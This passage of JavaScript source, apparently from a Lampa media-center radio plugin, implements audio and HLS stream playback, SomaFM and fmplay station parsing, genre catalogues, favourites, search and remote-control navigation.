      else if (showAnalyzer == 'ball') Visualizer.visualizeGraphics(played);
    };
    this.start = function (html) {
      var swipeDetector = new SwipeDetector({
        element: html,
        onSwipeLeft: function() {
        },
        onSwipeRight: function() {
          window.history.back();
        },
        onSwipeUp: function() {
          var pos = _component.move(1);
          _component.updateUI(pos, +1, -1);
        },
        onSwipeDown: function() {
          var pos = _component.move(-1);
          _component.updateUI(pos, -1, +1);
        },
        onLongPress: function() {
        },
        // Минимальное расстояние, которое должно быть пройдено, чтобы зафиксировать свайп
        swipeThreshold: 50,
        // Максимальное время, в течение которого должен быть совершен свайп
        swipeTimeThreshold: 300,
        // Время, в течение которого нажатие не должно считаться свайпом, а считаться просто нажатием
        tapDelay: 150,
        // Время, в течение которого должно быть зажато нажатие, чтобы оно считалось длительным
        longPressDelay: 800,
      });
    }
    this.destroy = function () {
      anf && cancelAnimationFrame(anf);
      info_html.remove();
      clearInterval(songsupdate);
      songsupdate = null; // release songs update timer
      currTrack = {};
    };
  }

  function Player() {
    var _this = this;
    var html = $('body');//Lampa.Template.js('radio_player');
    var miniPlayer = html.find('.m_fm-player');
    var cover = html.find('.m-radio-cover__img-container');

    var station;
    var url;
    var format = '';
    var hls;
    var screenreset;
    
    var player_html = miniPlayer.length && miniPlayer || Lampa.Template.get('modss_radio_play_player', {});
    var cover_html = cover.length && cover || Lampa.Template.get('modss_radio_cover', {});

    on("play", function () {
      played = true;
      player_html.toggleClass('pause', false);
    });
    on("pause", function () {
      if (Lampa.Player.opened()) {
        played = true;
        Lampa.Player.callback(function () {
          console.log('Modss_Radio', 'play', 'Close LAMPA player');
          Lampa.Controller.toggle('content');
          start();
        });
      } else {
        player_html.toggleClass('pause', true);
        player_html.toggleClass('play', false);
        _this.changeWave('loading');
        clearInterval(screenreset);
        screenreset = null;
      }
    });
    on("playing", function () {
      _this.changeWave('play');
      player_html.toggleClass('loading', false);
      player_html.toggleClass('play', true);
      if (!screenreset) {
        screenreset = setInterval(function () {
          Lampa.Screensaver.resetTimer();
        }, 5000);
      }
    });
    on("timeupdate", function () {
      if(Lampa.Player.opened() && played && _audio) { 
        played = false;
        _audio.pause();
        console.log('Modss_Radio', 'pause', 'Start LAMPA player');
      }
    });
    on("waiting", function () {
      _this.changeWave('loading');
      player_html.toggleClass('loading', true);
    });
    on("error", function (e) {
      audioErr = true;
      console.log('Modss_Radio', 'audio error:', e);
      var stationName = station ? (station.title || station.name || '') : '';
      var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка воспроизведения радио') + (stationName ? ': ' + stationName : '');
      Lampa.Noty.show(errorMsg);
      player_html.toggleClass('loading', false);
      player_html.toggleClass('stop', true);
      _this.changeWave('stop');
    });

    // handle player button click
    [player_html, cover_html].forEach(function (btn) {
      btn.on('hover:enter', function () {
        if (played && _audio && !_audio.paused) {
          html.find('.m-radio-item').filter('.play').toggleClass('play', false).toggleClass('stop', true);
          stop();
        } else if (url) {
          html.find('.m-radio-item').filter('.stop').toggleClass('play', true).toggleClass('stop', false);
          play();
        }
      });
      btn.on('hover:long', function () {
          html.find('.m-radio-item').filter('.play').toggleClass('play', false);
          btn.toggleClass('hide', true);
          stop('stop');
          Lampa.Controller.toggle('content');
      });
    });

    function prepare() {
      if (_audio && _audio.canPlayType('audio/vnd.apple.mpegurl')) load(); else if (Hls.isSupported() && format == "aacp") {
      //if (audio.canPlayType('application/vnd.apple.mpegurl') || url.indexOf('.aacp') > 0 || station.stream) load();else if (Hls.isSupported()) {
        try {
          hls = new Hls();
          hls.attachMedia(_audio);
          hls.loadSource(url);
          hls.on(Hls.Events.ERROR, function (event, data) {
            console.log('Modss_Radio', 'HLS error:', data);
            var stationName = station ? (station.title || station.name || '') : '';
            var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка загрузки радио') + (stationName ? ': ' + stationName : '');
            if (data.details === Hls.ErrorDetails.MANIFEST_PARSING_ERROR) {
              if (data.reason === "no EXTM3U delimiter") {
                Lampa.Noty.show(errorMsg);
              } else {
                Lampa.Noty.show(errorMsg);
              }
            } else if (data.details === Hls.ErrorDetails.NETWORK_ERROR || data.details === Hls.ErrorDetails.MEDIA_ERROR) {
              Lampa.Noty.show(errorMsg);
            } else {
              Lampa.Noty.show(errorMsg);
            }
            player_html.toggleClass('loading', false);
            player_html.toggleClass('stop', true);
            _this.changeWave('stop');
          });
          hls.on(Hls.Events.MANIFEST_LOADED, function () {
            start();
          });
        } catch (e) {
          console.log('Modss_Radio', 'HLS init error:', e);
          var stationName = station ? (station.title || station.name || '') : '';
          var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка инициализации плеера') + (stationName ? ': ' + stationName : '');
          Lampa.Noty.show(errorMsg);
          player_html.toggleClass('loading', false);
          player_html.toggleClass('stop', true);
          _this.changeWave('stop');
        }
      } else load();
    }
    function load() {
       if (_audio) {
        _audio.src = url;
        _audio.preload = 'metadata';
        _audio.crossOrigin = 'anonymous';
        _audio.autoplay = false;
        _audio.load();
        start();
      }
    }
    function start() {
      var startPlay = function() {
        if (!_audio) return;
        var playPromise;
        try {
          playPromise = _audio.play();
        } catch (e) {
          console.log('Modss_Radio', 'play error:', e);
        }
        if (playPromise !== undefined) {
          playPromise.then(function () {
            console.log('Modss_Radio', 'start plaining', url);
            _this.changeWave('play');
          })["catch"](function (e) {
            console.log('Modss_Radio', 'play promise error:', e.message);
            var stationName = station ? (station.title || station.name || '') : '';
            var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка воспроизведения радио') + (stationName ? ': ' + stationName : '');
            Lampa.Noty.show(errorMsg);
            player_html.toggleClass('loading', false);
            player_html.toggleClass('stop', true);
            _this.changeWave('stop');
          });
        } else {
          console.log('Modss_Radio', 'playPromise is undefined, audio state:', _audio ? _audio.readyState : 'no audio', 'context state:', _context ? _context.state : 'no context');
          if (_audio && _audio.readyState === 0) {
            var stationName = station ? (station.title || station.name || '') : '';
            var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка загрузки радио') + (stationName ? ': ' + stationName : '');
            Lampa.Noty.show(errorMsg);
            player_html.toggleClass('loading', false);
            player_html.toggleClass('stop', true);
            _this.changeWave('stop');
          }
        }
      };
      
      if (_context && _context.state === 'suspended') {
        _context.resume().then(function () {
          console.log('Modss_Radio', 'Audio context resumed before play');
          startPlay();
        }).catch(function (e) {
          console.log('Modss_Radio', 'Error resuming context:', e);
          var stationName = station ? (station.title || station.name || '') : '';
          var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка инициализации аудио') + (stationName ? ': ' + stationName : '');
          Lampa.Noty.show(errorMsg);
          player_html.toggleClass('loading', false);
          player_html.toggleClass('stop', true);
          _this.changeWave('stop');
          startPlay();
        });
      } else {
        startPlay();
      }
    }
    function play() {
      var startPrepare = function() {
        player_html.toggleClass('loading', true);
        player_html.toggleClass('stop', false);
        _this.createWave();
        prepare();
      };
      
      if (_context && _context.state === 'suspended') {
        _context.resume().then(function () {
          console.log('Modss_Radio', 'Audio context has been resumed.');
          startPrepare();
        }).catch(function (e) {
          console.log('Modss_Radio', 'Error resuming context in play():', e);
          var stationName = station ? (station.title || station.name || '') : '';
          var errorMsg = (Lampa.Lang.translate('radio_load_error') || 'Ошибка инициализации аудио') + (stationName ? ': ' + stationName : '');
          Lampa.Noty.show(errorMsg);
          player_html.toggleClass('loading', false);
          player_html.toggleClass('stop', true);
          _this.changeWave('stop');
          startPrepare();
        });
      } else {
        startPrepare();
      }
    }
    function stop(stop) {
      clearInterval(screenreset);
      screenreset = null; // release timer from the variable
      played = false;
      player_html.toggleClass('stop', true);
      player_html.toggleClass('play loading', false);
      _this.changeWave(stop || 'loading');
      if (hls) {
        hls.destroy();
        hls = false;
      }
      _audio.src = '';
    }
    this.createWave = function createWave() {
      var box = html.find('.m-radio-player__wave').html('');
      for (var i = 0; i < 15; i++) {
        var div = document.createElement('div');
        box.append(div);
      }
      _this.changeWave('loading');
    }
    this.changeWave = function changeWave(class_name, liness) {
      var lines = liness && liness.find('.m-radio-player__wave').querySelectorAll('div') || html.find('.m-radio-player__wave').length && html.find('.m-radio-player__wave')[0].children || false;
      for (var i = 0; i < lines.length; i++) {
        lines[i].removeClass('play loading').addClass(class_name);
        if (class_name == 'stop') lines[i].style = ''; 
        else {
          lines[i].style['animation-duration'] = (class_name == 'loading' ? 400 : 200 + Math.random() * 200) + 'ms';
          lines[i].style['animation-delay'] = (class_name == 'loading' ? Math.round(400 / lines.length * i) : 0) + 'ms';
        }
      }
    }
    this.create = function (station) {
      if (!miniPlayer.length) $('.head__actions .open--search').before(player_html);
      setupAudio();
    };
    this.info = function () {
      // add info
      if (Lampa.Storage.field('modssfm_show_info') === true) {
        if(info) info.update(station); else {
          info = new Info(station, this);
          info.create();
        }
        document.body.addClass('ambience--enable');
        Lampa.Background.change(station.largeimage || IMG_BG); // image - 120 | largeimage - 256 | xlimage 512
      }
    };
    this.play = function (stations) {
      if (window.currentPlayer && window.currentPlayer !== this && window.currentPlayer.destroy) {
        window.currentPlayer.destroy();
      }
      window.currentPlayer = this;

      station = stations;
      if (curPlayID !== station.id || !played) stop();

      // url = data.aacfile ? data.aacfile : data.mp3file;
      if (curPlayID !== station.id || !played) {
        url = station.video ? station.video : station.stream_320 ? station.stream_320 : station.stream_128 ? station.stream_128 : station.stream ? station.stream : station.stream_hls ? station.stream_hls.replace('playlist.m3u8', '96/playlist.m3u8') : '';

        this.info();

        if (station.stream && station.stream.urls) Promise.resolve(station.stream.urls).then(function (urls) {
          if (urls.length > 0) {
            url = urls[Math.floor(Math.random() * urls.length)];
            play();
          }
        }); else play();
        
        curPlayID = station.id;
      }
      // setup player button
      player_html.find('.m_fm-player__name').text(station.title);
      player_html.toggleClass('hide', false);
      var btn = player_html.find('.m_fm-player__button');
      if (btn) {
        btn.css({
          "background-image": "url('" + (station.bg_image_mobile || station.image) + "')",
          "background-size": "cover",
          "border-radius": "0.2em"
        });
      }
    };
    this.infoClose = function () {
      if (info) {
        info.destroy();
        info = false;
        anf && cancelAnimationFrame(anf);
        isInitialized = false;
      }
    };
    this.destroy = function () {
      stop();
      player_html.toggleClass('hide', true);
      clearInterval(screenreset);
      curPlayID = null;
      //html.remove();
    };
  }

  function Radio_n(object) {
    var player = window.m_play_player;
    if (!player && typeof Player === 'function') {
      player = new Player();
      player.create();
      window.m_play_player = player;
    }
    var _this6 = this;
    var last,
      scroll,
      played_st,
      filtred = [],
      items = [],
      page = 0;
    var html = document.createElement('div');
    var cache = Lampa.Storage.cache('radio_cache_st', 3, {});
    var img_bg = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAZCAYAAABD2GxlAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAHASURBVHgBlZaLrsMgDENXxAf3/9XHFdXNZLm2YZHQymPk4CS0277v9+ffrut62nEcn/M8nzb69cxj6le1+75f/RqrZ9fatm3F9wwMR7yhawilNke4Gis/7j9srQbdaVFBnkcQ1WrfgmIIBcTrvgqqsKiTzvpOQbUnAykVW4VVqZXyyDllYFSKx9QaVrO7nGJIB63g+FAq/xhcHWBYdwCsmAtvFZUKE0MlVZWCT4idOlyhTp3K35R/6Nzlq0uBnsKWlEzgSh1VGJxv6rmpXMO7EK+XWUPnDFRWqitQFeY2UyZVryuWlI8ulLgGf19FooAUwC9gCWLcwzWPb7Wa60qdlZxjx6ooUuUqVQsK+y1VoAJyBeJAVsLJeYmg/RIXdG2kPhwYPBUQQyYF0XC8lwP3MTCrYAXB88556peCbUUZV7WccwkUQfCZC4PXdA5hKhSVhythZqjZM0J39w5m8BRadKAcrsIpNZsLIYdOqcZ9hExhZ1MH+QL+ciFzXzmYhZr/M6yUUwp2dp5U4naZDwAF5JRSefdScJZ3SkU0nl8xpaAy+7ml1EqvMXSs1HRrZ9bc3eZUSXmGa/mdyjbmqyX7A9RaYQa9IRJ0AAAAAElFTkSuQmCC';
    _component = this;

    this.create = function () {
      var _this = this;
      this.activity.loader(true);

      _this.data = {
        genre: [],
        stations: []
      };

      var last_st = Lampa.Arrays.getKeys(cache).reduce(function(result, key) {
        if (cache[key].hasOwnProperty('last') && cache[key].last === true) {
          result = cache[key];
          result.key = key;
          result.change = false;
        }
        return result;
      }, {});

      
      if (last_st) object = Object.assign({}, object, RadioApi.stantion().find(function (s) {
        if(object.url == '' || object.change || last_st.last) return last_st.key == s.title;
        if(!object.change) return s.id == last_st.id;
      }));
      
      _this._object = object;
      RadioApi.list(object).then(function (result) {
        _this.buildChanel(result);

        if (last_st.id == -1 && RadioFavorites.get().length) filtred = RadioFavorites.get();
        else if (last_st.id >= 0) {
          filtred = _this6.data.stations.filter(function (s) {
            return s.genre.find(function (g) {
              return g.id == last_st.id;
            });
          });
          if (!filtred.length) filtred = _this6.data.stations;
        } else filtred = _this6.data.stations && _this6.data.stations || _this6.data;
  
        filtred = filtred.sort(function (a, b) {
          return b.listeners - a.listeners;
        });

        //console.log('result',{cache, object, data3: _this6.data, filtred})

        _this.build();
      })["catch"](function (e) {
        console.log('Modss_Radio', 'error',e);
        _this.data = {
          stations: []
        };
        _this.build();
      });
      
      return this.render();
    };
    this.buildChanel = function (result) {
      if (object.id == 2) {
        var parseINIString = function parseINIString(data) {
          var regex = {
          section: /^\s*\[\s*([^\]]*)\s*\]\s*$/,
          param: /^\s*([^=]+?)\s*=\s*(.*?)\s*$/,
          comment: /^\s*;.*$/
          };
          var value = {};
          var lines = data.split(/[\r\n]+/);
          var section = null;
          lines.forEach(function (line) {
          if (regex.comment.test(line)) {
            return;
          } else if (regex.param.test(line)) {
            var match = line.match(regex.param);
            if (section) {
            value[section][match[1]] = match[2];
            } else {
            value[match[1]] = match[2];
            }
          } else if (regex.section.test(line)) {
            var match = line.match(regex.section);
            value[match[1]] = {};
            section = match[1];
          } else if (line.length == 0 && section) {
            section = null;
          };
          });
          return value;
        }
        var getUrlsFromPlaylist = function getUrlsFromPlaylist(playlistUrl) {
          return new Promise(function (resolve, reject) {
            var error = 'There was a problem parse urls from playlist ' + playlistUrl + ' from SomaFM.';
            RadioApi.network.timeout(5000);
            RadioApi.network.native(playlistUrl, function (response) {
              try {
                var data = parseINIString(response); // decode pls INI
                var result = [];
                for (var key in data.playlist) {
                  if (key.match(/^File\d+$/)) result.push(data.playlist[key]);
                }
                !result.length ? reject(error) : resolve(result);
              } catch (e) {
                console.log('Modss_Radio', 'SomaFM', error, e.message);
                reject(e);
              }
            }, function () { }, false, {
              dataType: 'text'
            });
          });
        }
        var getStreamUrls = function getStreamUrls(channel) {
          if (channel.stream.urls) return Promise.resolve(channel.stream.urls);
          return getUrlsFromPlaylist(channel.stream.url);
        }
        var getHighestQualityStream = function getHighestQualityStream(channel, streams) {
          for (var ks in streams) {
            var stream = streams[ks];
            for (var kp in channel.playlists) {
              var playlist = channel.playlists[kp];
              if (
                (!stream.urlRegex || stream.urlRegex.test(playlist.url))
                && (!stream.quality || playlist.quality === stream.quality)
                && (!stream.format || playlist.format === stream.format)
              ) {
                return {
                  url: playlist.url,
                  format: playlist.format,
                  quality: playlist.quality
                };
              }
            }
          }
          return null;
        }

        _this6.data.stations = Lampa.Arrays.getKeys(result.channels).map(function (key, i) {
          var station = result.channels[key];
          if (Array.isArray(station.playlists)) {
            var categories = station.genre.split('|');
            var genres = categories.reduce(function (acc, category) {
              var genre = _this6.data.genre.find(function (g) {
                return g.name === category.trim();
              });

              if (!genre) {
                genre = {
                  name: category.trim(),
                  id: _this6.data.genre.length
                };
                _this6.data.genre.push(genre);
              }

              acc.push(genre);
              return acc;
            }, []);
            var url = new URL(object.url).origin;
            station.songsurl = url + '/songs/' + station.id + '.json';
            station.infourl = url + '/' + station.id + '/';
            station.stream = getHighestQualityStream(station, PREFERRED_STREAMS);
            station.stream.urls = getStreamUrls(station);
            station.genres = station.genre;
            station.tooltip = station.description;
            station.genre = genres;
            station.image = station.largeimage;

            return station;
          }
        });
      } else if (object.id == 3) {
        var imageCreate = function (station) {
          var isDarkTheme = true; //todo add checkTheme
          var logoKey = 'logo' + (isDarkTheme ? '-d' : '') + (isSupportWebp() ? '_webp' : '');
          var img = 'https://fmplay.ru/' + station[logoKey];
          return img;
        };
        _this6.data.stations = Object.keys(result).map(function (key, i) {
          var station = result[key];
          var category = station.category;
          var genre = _this6.data.genre.some(function (g) {
            return g.name === category;
          }) ? _this6.data.genre.find(function (g) {
            return g.name === category;
          }) : _this6.data.genre.push({ name: category, id: i }) - 1;
          return {
            id: i,
            prefix: key,
            title: station.name,
            image: imageCreate(station),
            stream: station.url_hi || station.url || station.url_low || station.xtra_low,
            songIdUrl: 'https://pic.fmplay.ru/stations/' + key + '/fmplay_id.json',
            songUrl: 'https://pic.fmplay.ru/stations/' + key + '/fmplay_current.json',
            genre: [genre]
          };
        });

        _this6.data.genre = Object.keys(_this6.data.genre).map(function (key) {
          return _this6.data.genre[key];
        });

      } else _this6.data = result.result && result.result || result;
    };
    this.background = function () {
      Lampa.Background.immediately(last ? last.background || img_bg : img_bg);
    };
    this.build = function () {
      var _this2 = this;
      html.append(Lampa.Template.js('modss_radio_content'));
      scroll = new Lampa.Scroll({
        mask: true,
        over: true
      });
      scroll.onEnd = function () {
        if(filtred.length > 100) {
          page++;
          _this2.next();
        }
      };
      html.find('.m-radio-content__list').append(scroll.render(true));
      html.find('.m-radio-content__cover').append(Lampa.Template.js('modss_radio_cover'));
      scroll.minus(html.find('.m-radio-content__head'));

      this.buildStantion();
      this.buildCatalog();
      this.buildSearch();
      this.buildAdd();
      this.display();
      Lampa.Layer.update(html);
      this.activity.loader(false);
    };
    this.clearButtons = function (category, search) {
      var btn_catalog = html.find('.button--catalog');
      var btn_search = html.find('.button--search');
      btn_catalog.find('div').addClass('hide').text('');
      btn_search.find('div').addClass('hide').text('');
      if (category) {
        btn_catalog.find('div').removeClass('hide').text(category);
      } else {
        btn_search.find('div').removeClass('hide').text(search);
      }
    };
    this.buildStantion = function () {
      var _this3 = this;
      var btn = html.find('.button--stantion');
      var items = [];

      RadioApi.stantion().forEach(function(el) {
        items.push(el);
      });
      
      btn.on('hover:enter', function () {
        Lampa.Select.show({
          title: Lampa.Lang.translate('radio_station'),
          items: items.map(function (s) {
            s.selected = s.title == (object.url == '' && RadioApi.stantion()[0].title || object.title);
            return s;
          }),
          onSelect: function onSelect(a) {
            if(!Lampa.Arrays.getKeys(cache[a.title]).length) cache[a.title] = {};
            cache[a.title].last = false;
            cache[a.title].change = true;
            for (var key in cache) {
              if (cache.hasOwnProperty(key)) {
                if (a.title === key) {
                  cache[key].last = true;
                } else {
                  cache[key].last = false;
                }
              }
            }
            Lampa.Storage.set('radio_cache_st', cache);

            Lampa.Activity.replace(a);
            _this3.clearButtons(a.title, false);
            _this3.display();
            setTimeout(function() {
              var currentPlayingInList = curPlayID && _this3.data.stations.find(function(s) { return s.id == curPlayID; });
              if (!currentPlayingInList && items.length > 0 && scroll && typeof scroll.update === 'function') {
                Navigator.focus(items[0]);
                scroll.update(items[0]);
              }
            }, 200);
          },
          onBack: function onBack() {
            Lampa.Controller.toggle('content');
          }
        });
      });
    };
    this.buildCatalog = function () {
      var _this3 = this;
      var btn = html.find('.button--catalog');
      var items = [];
      var favs = RadioFavorites.get().length;
      items.push({
        title: Lampa.Lang.translate('settings_input_links') + ' [' + favs + ']',
        ghost: !favs,
        noenter: !favs,
        favorite: true,
        id: -1
      });
      if (this.data.stations && this.data.stations.length) {
        items.push({
          title: Lampa.Lang.translate('settings_param_jackett_interview_all') + ' [' +  _this3.data.stations.length + ']',
          all: true,
          id: -2
        });
        
        this.data.genre.forEach(function (g) {
          var numST = _this3.data.stations.filter(function (s) {
            return s.genre.find(function (d) {
              return d.id == g.id;
            });
          }).length;

          items.push({
            title: g.name + ' [' + numST + ']',
            id: g.id
          });
        });
      }

      var active = items.find(function (s) {
        var title = object.url == '' && RadioApi.stantion()[0].title || object.title;
        return cache[title] && cache[title].id === s.id;
      });

      _this3.clearButtons((items[1] && (active && active.ghost || !active)) && items[1].title || active && active.title || items[0].title, false);

      if (active && active.ghost && !favs) {
        if(!filtred.length) filtred = _this3.data.stations;
        _this3.display();
      }
      
      btn.on('hover:enter', function () {
        Lampa.Select.show({
          title: Lampa.Lang.translate('title_genre'),
          items: items.map(function (s) {
            if(active && active.ghost) s.selected = s.id == -2;
            if(active && !active.ghost) s.selected = s.id == active.id;
            return s;
          }),
          onSelect: function onSelect(a) {
            if (a.favorite) {
              filtred = RadioFavorites.get();
            } else if (a.all) filtred = _this3.data.stations;else {
              filtred = _this3.data.stations.filter(function (s) {
                return s.genre.find(function (g) {
                  return g.id == a.id;
                });
              });
            }

            a.last = true;
            cache[object.url == '' ? RadioApi.stantion()[0].title : object.title] = a;
            Lampa.Storage.set('radio_cache_st', cache);
            
            _this3.clearButtons(a.title, false);
            _this3.buildCatalog();
            _this3.display();
          },
          onBack: function onBack() {
            Lampa.Controller.toggle('content');
          }
        });
      });
    };
    this.buildAdd = function () {
      var _this4 = this;
      var btn = html.find('.button--add');
      btn.on('hover:enter', function () {
        Lampa.Input.edit({
          title: Lampa.Lang.translate('radio_add_station'),
          free: true,
          nosave: true,
          nomic: true,
          value: ''
        }, function (url) {
          if (url) {
            RadioFavorites.add({
              user: true,
              stream: url,
              title: Lampa.Lang.translate('radio_station')
            });
            filtred = RadioFavorites.get();
            _this4.clearButtons(Lampa.Lang.translate('settings_input_links'), false);
            _this4.buildCatalog();
            _this4.display();
          } else {
            Lampa.Controller.toggle('content');
          }
        });
      });
    };
    this.buildSearch = function () {
      var _this5 = this;
      var btn = html.find('.button--search');
      btn.on('hover:enter', function () {
        Lampa.Input.edit({
          free: true,
          nosave: true,
          nomic: true,
          value: ''
        }, function (val) {
          if (val) {
            val = val.toLowerCase();
            filtred = _this5.data.stations.filter(function (s) {
              return s.title.toLowerCase().indexOf(val) >= 0 || s.tooltip.toLowerCase().indexOf(val) >= 0;
            });
            _this5.clearButtons(false, val);
            _this5.display();
          } else {
            Lampa.Controller.toggle('content');
          }
        });
      });
    };
    this.play = function (station) {
      if (!player || typeof player.play !== 'function') return;
      played_st = station;
      player.play(station, _this6);
      Lampa.Background.change(station.bg_image_mobile || station.image || img_bg);
    };
    this.display = function () {
      scroll.clear();
      scroll.reset();
      last = false;
      page = 0;
      this.cover({
        title: '',
        tooltip: ''
      });
      items = [];
      if (filtred.length) this.next();else {
        for (var i = 0; i < 3; i++) {
          var empty = Lampa.Template.js('modss_radio_list_item');
          empty.addClass('empty--item');
          empty.style.opacity = 1 - 0.3 * i;
          scroll.append(empty);
        }
        Lampa.Layer.visible(scroll.render(true));
      }
      this.activity.toggle();
    };
    this.next = function () {
      var views = 10;
      var start = page * views;
      if(filtred.length > 100) filtred.slice(start, start + views).forEach(_this6.append.bind(_this6));
      else filtred.forEach(_this6.append.bind(_this6));
      Lampa.Layer.visible(scroll.render(true));
    };
    this.append = function (station) {
      var _this7 = this;
      var item = Lampa.Template.js('modss_radio_list_item');
      if (!station.id) station.id = (filtred.indexOf(station) + 1);
      item.find('.m-radio-item__num').text((filtred.indexOf(station) + 1).pad(2));
      item.find('.m-radio-item__title').text(station.title || station.name);
      item.find('.m-radio-item__tooltip').text(station.tooltip || '');

      if(station.listeners) item.find('.m-radio-item__listeners-count').text(station.listeners);
      else item.find('.m-radio-item__listeners').addClass('hide');
      item.background = station.bg_image_mobile || station.image || station.picture || img_bg;
      var img_box = item.find('.m-radio-item__cover-box');
      var img_elm = item.find('img');
      img_elm.onload = function () {
        img_box.addClass('loaded');
      };
      img_elm.onerror = function () {
        img_elm.src = './img/icons/menu/movie.svg';
        img_box.addClass('loaded-icon');
      };
      img_elm.src = station.bg_image_mobile || station.image || station.picture;
      item.on('hover:focus hover:hover', function () {
        _this7.cover(station);
        //scroll.render().find('.focused').removeClass('focused');
        //item.addClass('focused');
        Lampa.Background.change(item.background);
        last = item;
      });
      item.on('hover:focus', function () {
        scroll.update(item);
      });
      item.on('hover:enter', function () {
        if (curPlayID !== station.id) scroll.render().find('.play').removeClass('play pause');
        item.addClass('play');
        _this7.play(station);
        var up = filtred.indexOf(station) + 1;
        var down = filtred.indexOf(station) - 1;
        $('body').find('.m-radio-cover__after_statntion').text(filtred[up] ? filtred[up].title : station.title);
        $('body').find('.m-radio-cover__before_statntion').text(filtred[down] ? filtred[down].title : station.title);
      });
      item.on('hover:long', function () {
        if (station.user) {
          Lampa.Select.show({
            title: Lampa.Lang.translate('menu_settings'),
            items: [{
              title: Lampa.Lang.translate('extensions_change_name'),
              change: 'title'
            }, {
              title: Lampa.Lang.translate('extensions_change_link'),
              change: 'stream'
            }, {
              title: Lampa.Lang.translate('extensions_remove'),
              remove: true
            }],
            onSelect: function onSelect(a) {
              if (a.remove) {
                RadioFavorites.remove(station);
                item.remove();
                last = false;
                Lampa.Controller.toggle('content');
              } else {
                Lampa.Input.edit({
                  free: true,
                  nosave: true,
                  nomic: true,
                  value: station[a.change] || ''
                }, function (val) {
                  if (val) {
                    station[a.change] = val;
                    RadioFavorites.update(station);
                    _this7.cover(station);
                    item.find('.m-radio-item__' + (a.change == 'title' ? 'title' : 'tooltip')).text(val);
                  }
                  Lampa.Controller.toggle('content');
                });
              }
            },
            onBack: function onBack() {
              Lampa.Controller.toggle('content');
            }
          });
        } else {
          RadioFavorites.toggle(station);
          _this7.buildCatalog();
          item.toggleClass('favorite', Boolean(RadioFavorites.find(station)));
        }
      });
      
      item.toggleClass('favorite', Boolean(RadioFavorites.find(station)));
      if (!last) last = item;
      if (Lampa.Controller.own(this)) Lampa.Controller.collectionAppend(item);
      if (curPlayID == station.id) item.addClass('play');
      scroll.append(item);
      items.push(item);
    };
    this.cover = function (station) {
      html.find('.m-radio-cover__title').text(station.title || station.name || '');
      html.find('.m-radio-cover__tooltip').text(station.tooltip || '');
      var img_box = html.find('.m-radio-cover__img-box');
      var img_elm = img_box.find('img');
      img_box.removeClass('loaded loaded-icon');
      img_elm.onload = function () {
        img_box.addClass('loaded');
      };
      img_elm.onerror = function () {
        img_elm.src = './img/icons/menu/movie.svg';
        img_box.addClass('loaded-icon');
      };
      img_elm.src = station.bg_image_mobile || station.image || station.picture;
    };
    this.start = function () {
      var _this2 = this;
      if (Lampa.Activity.active() && Lampa.Activity.active().activity !== this.activity) return;
      this.background();

      var cover = Lampa.Template.js('modss_radio_cover');
      var move = function move(d) {
        var pos = filtred.indexOf(played_st) + d;
        if (pos >= 0 && pos <= filtred.length) {
          //player.destroy();
          if(filtred[pos]) {
            _this6.cover(filtred[pos]);
            _this6.play(filtred[pos]);
          }
        }
        return pos;
      }
      var updateUI = function(pos, up, down) {
        scroll.render().find('.play').removeClass('play');
        if(items[pos]) {
          if ($('body').hasClass('ambience--enable')) {
            $('body').find('.m-radio-cover__after_statntion').text(filtred[pos + up] && (filtred[pos + up].title || filtred[pos + up].name) || filtred[pos].title || filtred[pos].name);
            $('body').find('.m-radio-cover__before_statntion').text(filtred[pos + down] && (filtred[pos + down].title || filtred[pos + down].name) || filtred[pos].title || filtred[pos].name);
          }
          last = items[pos].addClass('play');
          scroll.update(last);
        } else {
          scroll.update(last.addClass('play'));
          if($('body').hasClass('ambience--enable')) return;
        }
      };
      _this2.move = move;
      _this2.updateUI = updateUI;

      Lampa.Controller.add('content', {
        link: this,
        invisible: true,
        toggle: function toggle() {
          var lastPlay = html.find('.play');
          if(lastPlay) {
            var active = Object.keys(items).find(function(key) {
              return items[key].classList.contains('play')
            });

            var lastPlay2 = scroll.render().find('.play');
            last = lastPlay2;
            played_st = filtred[active];
            setTimeout(function() {
              player.createWave();
              player.changeWave('play');
              if(last && $(last).length && scroll) scroll.update(last, true);
            },100);
          } 

          Lampa.Controller.collectionSet(html, cover);
          Lampa.Controller.collectionFocus(last, html, cover);
        },
        left: function left() {
          if($('body').hasClass('ambience--enable') && !$('body').find('.m-radio-cover__img-container').hasClass('focus')) return;
          var cover = $('body').find('.m-radio-cover__img-container');
          if (cover.hasClass('focus')) Navigator.focus(last);
          else if (Navigator.canmove('left')) Navigator.move('left');
          else Lampa.Controller.toggle('menu');
        },
        right: function right() {
          if($('body').hasClass('ambience--enable') && !$('body').find('.m-radio-cover__img-container').hasClass('focus')) return;
          var cover = $('body').find('.m-radio-cover__img-container');
          if (cover.hasClass('focus')) Navigator.focus(items[0]);
          else if(Navigator.canmove('right')) Navigator.move('right');
          else Navigator.focus(cover[0]);
        },
        up: function up() {
          if($('body').hasClass('ambience--enable') && !$('body').find('.m-radio-cover__img-container').hasClass('focus')) return;
          if (Navigator.canmove('up')) Navigator.move('up');
          else if ($('body').find('.m-radio-cover__img-container').hasClass('focus')) {
            var pos = move(-1);
            updateUI(pos, -1, +1);
          } else Lampa.Controller.toggle('head');
        },
        down: function down() {
          if($('body').hasClass('ambience--enable') && !$('body').find('.m-radio-cover__img-container').hasClass('focus')) return;
          if (Navigator.canmove('down')) Navigator.move('down');
          else {
            if ($('body').find('.m-radio-cover__img-container').hasClass('focus')) {
              var pos = move(1);
              updateUI(pos, +1, -1);
            }
          }
        },
        back: function back() {
          if($('body').hasClass('ambience--enable')) {
            document.body.removeClass('ambience--enable');
            player.infoClose();
            scroll.update(last, true);
            //if (_component) _component.activity.toggle();
            //Lampa.Controller.toggle('content');
          } else Lampa.Activity.backward();
        }
      });
      Lampa.Controller.toggle('content');
    };
    this.pause = function () {};
    this.stop = function () {};
    this.render = function () {
      return html;
    };
    this.destroy = function () {
      //player.destroy();
      if (scroll) scroll.destroy();
      scroll = null;
      Lampa.Arrays.destroy(items);
      html.remove();
      html = null;
      items = null;
      filtred = null;
    };
  }
	
	
	function startPlugin() {
		window.plugin_modss = true;
